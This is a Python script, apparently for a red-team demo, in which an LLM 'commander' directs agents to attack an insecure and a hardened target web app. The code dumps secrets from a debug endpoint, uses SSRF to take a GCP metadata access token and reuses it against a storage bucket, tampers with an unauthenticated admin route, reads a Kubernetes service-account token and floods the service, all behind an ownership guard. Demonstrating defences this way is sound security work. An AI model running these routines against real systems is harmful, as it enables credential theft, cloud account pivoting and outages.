#!/usr/bin/env python3
"""
swarm.py — an agentic red-team swarm for the cloud-breach demo.

An LLM 'commander' plans the attack from live recon; worker agents execute the
objectives and a subset coordinates a flood. The same command is run against the
INSECURE and the SECURE target — the cluster is what changed, so the scoreboard
flips from red to green in front of the audience.

SAFETY: the swarm refuses to fire at anything that isn't localhost / a private
range / a *.svc cluster address unless you explicitly assert ownership with
--allow <host> and SWARM_I_OWN_THIS=1. Point it only at systems you own.

Usage:
  python swarm.py --target http://127.0.0.1:8080 --label insecure
  python swarm.py --target http://<lb-ip> --label secure --allow <lb-ip> \
      --gcs-bucket my-loot-bucket        # (SWARM_I_OWN_THIS=1 for public IPs)
"""
from __future__ import annotations

import argparse
import asyncio
import ipaddress
import os
import socket
import statistics
import time
from urllib.parse import urlparse

import httpx

import llm
import report
from playbook import OBJECTIVES, RECON_WORDLIST

DEFAULT_METADATA_URL = os.environ.get(
    "METADATA_URL",
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token")


# --------------------------------------------------------------------------- #
# Safety guard
# --------------------------------------------------------------------------- #
def assert_owned(target: str, allow: list[str]) -> None:
    host = urlparse(target).hostname or ""
    if host in ("localhost", "127.0.0.1", "::1") or host in allow:
        return
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            return
    except Exception:  # noqa: BLE001
        pass
    if host.endswith(".svc") or host.endswith(".svc.cluster.local"):
        return
    if os.environ.get("SWARM_I_OWN_THIS") == "1" and host in allow:
        return
    raise SystemExit(
        f"REFUSING to attack '{host}': not localhost/private/cluster-local.\n"
        f"If you own it, re-run with --allow {host} and SWARM_I_OWN_THIS=1.")


# --------------------------------------------------------------------------- #
# Objectives  (each returns {'breached': bool, 'detail': str})
# --------------------------------------------------------------------------- #
async def obj_recon(c: httpx.AsyncClient, base: str) -> tuple[dict, dict]:
    found = {}
    for path in RECON_WORDLIST:
        try:
            r = await c.get(base + path)
            found[path] = r.status_code
        except Exception:  # noqa: BLE001
            found[path] = "err"
    open_paths = [p for p, s in found.items() if s == 200]
    detail = f"{len(open_paths)} live routes: " + ", ".join(open_paths[:6])
    return {"breached": True, "detail": detail}, found


async def obj_exfil_env(c: httpx.AsyncClient, base: str) -> dict:
    r = await c.get(base + "/debug/env")
    if r.status_code != 200:
        return {"breached": False, "detail": "/debug/env -> 404 (no secret dump)"}
    env = r.json()
    loot = {k: env[k] for k in ("DB_PASSWORD", "LLM_API_KEY", "ADMIN_TOKEN") if k in env}
    if not loot:
        return {"breached": False, "detail": "endpoint open but no secrets present"}
    report.log(f"    🔓 STOLEN via /debug/env: {loot}", "red")
    return {"breached": True, "detail": f"stole {', '.join(loot)}"}


async def obj_ssrf_metadata(c: httpx.AsyncClient, base: str, bucket: str | None,
                            metadata_url: str) -> dict:
    r = await c.get(base + "/fetch", params={"url": metadata_url, "h": "Metadata-Flavor:Google"})
    if r.status_code in (403, 502) and "blocked" in r.text.lower():
        return {"breached": False, "detail": "SSRF blocked by egress policy"}
    body = r.text
    if "access_token" not in body and r.status_code != 200:
        return {"breached": False, "detail": f"metadata unreachable ({r.status_code})"}
    report.log("    🔑 SSRF reached the metadata server — cloud token exposed", "red")
    detail = "stole workload GCP access token via metadata SSRF"
    if bucket:  # try to use the loot
        try:
            import json
            tok = json.loads(body).get("access_token")
            if tok:
                g = await c.get(
                    f"https://storage.googleapis.com/storage/v1/b/{bucket}/o",
                    headers={"Authorization": f"Bearer {tok}"})
                if g.status_code == 200:
                    n = len(g.json().get("items", []))
                    detail += f"; listed {n} objects in gs://{bucket}"
                    report.log(f"    🪣 read gs://{bucket} with the stolen token", "red")
        except Exception:  # noqa: BLE001
            pass
    return {"breached": True, "detail": detail}


async def obj_admin_takeover(c: httpx.AsyncClient, base: str) -> dict:
    r = await c.post(base + "/admin/config", json={"discount_pct": 99})
    if r.status_code == 401:
        return {"breached": False, "detail": "admin route -> 401 (auth required)"}
    v = await c.get(base + "/deals")
    d = v.json().get("discount_pct")
    if d == 99:
        report.log("    💸 all deals set to 99% OFF via unauth admin route", "red")
        return {"breached": True, "detail": "set every deal to 99% off (revenue impact)"}
    return {"breached": False, "detail": "admin change did not take effect"}


async def obj_sa_pivot(c: httpx.AsyncClient, base: str) -> dict:
    r = await c.get(base + "/admin/secrets")
    if r.status_code == 401:
        return {"breached": False, "detail": "/admin/secrets -> 401"}
    tok = r.json().get("k8s_sa_token")
    if tok:
        return {"breached": True, "detail": "read mounted k8s SA token -> k8s API reachable"}
    return {"breached": False, "detail": "no SA token mounted"}


async def obj_backdoor(c: httpx.AsyncClient, base: str) -> dict:
    r = await c.get(base + "/pwned")
    if r.status_code == 200 and r.json().get("backdoor"):
        report.log("    ☠️  /pwned responded — a tampered image is running", "red")
        return {"breached": True, "detail": "tampered image admitted; backdoor live"}
    return {"breached": False, "detail": "no backdoor route (image was verified/blocked)"}


def flood_verdict(p95: float, err_rate: float, rl_rate: float,
                  health_fail: float) -> tuple[dict, str]:
    """Pure decision: given attack telemetry, is availability breached?
    Returns (result, availability_label). Separated out so it is unit-testable
    without standing up a server. 429 = defended; 5xx/timeout/health-fail = broken."""
    if health_fail > 0.3 or p95 > 3000 or err_rate > 20:
        why = (f"health probes failing {round(health_fail*100)}%" if health_fail > 0.3
               else f"legit p95={p95}ms, {err_rate}% errors")
        return {"breached": True, "detail": f"service unusable — {why}"}, "DEGRADED/DOWN"
    if rl_rate > 25:
        return ({"breached": False,
                 "detail": f"{rl_rate}% of flood rejected (429); service stayed up"}, "healthy")
    return {"breached": False, "detail": f"absorbed flood, p95={p95}ms"}, "healthy"


async def obj_flood(base: str, agents: int, duration: float) -> tuple[dict, dict]:
    """Swarm floods /deals/search (measuring its own latency) while a probe
    watches /health. We separate 429 (defended) from 5xx/timeout (broken)."""
    stop = time.monotonic() + duration
    slat: list[float] = []            # search latencies
    cnt = {"total": 0, "ok": 0, "rl": 0, "err": 0}   # rl=429, err=5xx/timeout
    health = {"total": 0, "fail": 0}  # health probe failures (event-loop starvation)

    async def flooder():
        async with httpx.AsyncClient(timeout=6.0) as c:
            while time.monotonic() < stop:
                cnt["total"] += 1
                t0 = time.monotonic()
                try:
                    r = await c.get(base + "/deals/search", params={"q": "spa"})
                    slat.append((time.monotonic() - t0) * 1000)
                    if r.status_code == 429:
                        cnt["rl"] += 1
                    elif r.status_code >= 500:
                        cnt["err"] += 1
                    else:
                        cnt["ok"] += 1
                except Exception:  # noqa: BLE001 (timeout = service unusable)
                    cnt["err"] += 1

    async def probe():
        async with httpx.AsyncClient(timeout=1.5) as c:
            while time.monotonic() < stop:
                health["total"] += 1
                try:
                    r = await c.get(base + "/health")
                    if r.status_code >= 500:
                        health["fail"] += 1
                except Exception:  # noqa: BLE001 (health timed out = liveness would restart)
                    health["fail"] += 1
                await asyncio.sleep(0.4)

    await asyncio.gather(*[flooder() for _ in range(agents)], probe())

    p95 = round(statistics.quantiles(slat, n=20)[-1], 1) if len(slat) >= 20 else (
        round(max(slat), 1) if slat else 0.0)
    err_rate = round(100 * cnt["err"] / max(1, cnt["total"]), 1)
    rl_rate = round(100 * cnt["rl"] / max(1, cnt["total"]), 1)
    health_fail = health["fail"] / max(1, health["total"])
    metrics = {"requests": cnt["total"], "p95_ms": p95, "error_rate": err_rate}

    result, availability = flood_verdict(p95, err_rate, rl_rate, health_fail)
    metrics["availability"] = availability
    return result, metrics


# --------------------------------------------------------------------------- #
# Orchestration
# --------------------------------------------------------------------------- #
async def run(args) -> None:
    base = args.target.rstrip("/")
    assert_owned(base, args.allow)
    results: dict = {}
    metrics: dict = {"requests": 0, "p95_ms": 0, "error_rate": 0, "availability": "?"}

    async with httpx.AsyncClient(timeout=6.0) as c:
        report.log(f"\n[ recon ] probing {base} ...", "cyan")
        recon_res, recon = await obj_recon(c, base)
        results["recon"] = recon_res

        plan = llm.command(recon)
        report.log(f"[ commander ] mode={plan['provider']}  plan={plan['plan']}", "magenta")
        report.log(f"[ commander ] intent: {plan['intent']}\n", "magenta bold")

        for name in plan["plan"]:
            if name in ("recon", "flood"):
                continue
            report.log(f"[ agent ] {OBJECTIVES[name][0]}: {OBJECTIVES[name][1]}", "cyan")
            if name == "exfil_env":
                results[name] = await obj_exfil_env(c, base)
            elif name == "ssrf_metadata":
                results[name] = await obj_ssrf_metadata(c, base, args.gcs_bucket, args.metadata_url)
            elif name == "admin_takeover":
                results[name] = await obj_admin_takeover(c, base)
            elif name == "sa_pivot":
                results[name] = await obj_sa_pivot(c, base)
            elif name == "backdoor":
                results[name] = await obj_backdoor(c, base)

    report.log(f"\n[ swarm ] {args.agents} agents flooding for {args.duration}s ...", "yellow")
    results["flood"], metrics = await obj_flood(base, args.agents, args.duration)

    report.scoreboard(args.label, results, metrics)
    breached = sum(1 for r in results.values() if r["breached"])
    line = llm.summarize({k: v["detail"] for k, v in results.items() if v["breached"]})
    report.headline(args.label, breached, len(results), line)


def main() -> None:
    p = argparse.ArgumentParser(description="Agentic red-team swarm (authorized demo use only)")
    p.add_argument("--target", required=True, help="base URL, e.g. http://127.0.0.1:8080")
    p.add_argument("--label", default="target", help="scoreboard label (insecure|secure)")
    p.add_argument("--agents", type=int, default=8, help="flood concurrency")
    p.add_argument("--duration", type=float, default=8.0, help="flood seconds")
    p.add_argument("--allow", action="append", default=[], help="host you assert you own")
    p.add_argument("--gcs-bucket", default=os.environ.get("LOOT_BUCKET"),
                   help="bucket to test the stolen token against")
    p.add_argument("--metadata-url", default=DEFAULT_METADATA_URL,
                   help="SSRF target (override for the offline fake metadata server)")
    asyncio.run(run(p.parse_args()))


if __name__ == "__main__":
    main()
